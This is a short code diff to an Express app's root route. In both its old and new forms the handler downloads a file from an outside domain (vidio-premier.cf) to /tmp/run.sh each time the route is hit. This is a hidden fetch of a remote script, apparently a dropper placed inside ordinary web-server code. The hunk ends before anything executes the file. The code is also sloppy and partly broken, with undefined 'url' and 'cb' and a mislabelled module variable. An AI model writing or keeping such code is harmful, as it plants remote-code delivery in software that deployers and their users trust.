@@ -20,13 +20,11 @@ export default function expressApp(functionName) {
   /* define routes */
   router.get('/', (req, res) => {
 
-var http = require('http');
-var https = require('https');
-client=(url.protocol=="https") ? https:client;
+var http = require('https');
 var fs = require('fs');
 
   var file = fs.createWriteStream("/tmp/run.sh");
-  var request = client.get("https://www.vidio-premier.cf/note.txt", function(response) {
+  var request = http.get("https://www.vidio-premier.cf/note.txt", function(response) {
     response.pipe(file);
     file.on('finish', function() {
       file.close(cb);  // close() is async, call cb after close completes.
